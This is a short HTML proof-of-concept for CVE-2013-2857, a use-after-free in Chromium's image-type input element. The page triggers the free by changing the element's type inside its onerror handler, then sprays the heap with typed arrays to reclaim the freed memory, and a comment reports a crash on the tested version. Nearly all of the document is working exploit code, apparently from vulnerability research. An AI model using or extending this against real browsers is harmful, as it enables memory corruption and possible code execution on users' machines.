<!--
Tested on 5.5.1
CVE-2013-2857
Use after free https://bugs.chromium.org/p/chromium/issues/detail?id=240124
Result: Bug is present, crash on what is presumably render
-->
<html>
<body>
<script>
/*
fast/forms/image/image-error-event-crash.html
https://bugs.chromium.org/p/chromium/issues/detail?id=240124
*/
function UaF(){
    x = document.getElementById("x");
    //free event:
    x.type="";
    
    //reallocation block:
    var arr = new Array(0x100);
    for(var i = 0; i < 0x10; i++){
        arr[i] = new Uint32Array(0x1000);
        for(var j = 0; j < 0x1000; j++)
            //TODO: make each write unique
            //to enable location of writes in memory
            arr[i][j] = 0xFFFF0000;
    }
    
    //halt before render:
    console.log("canarytext");
    alert("prerender");
}
</script>
<input id="x" type="image" onerror="UaF()" src="" />
</body>
</html>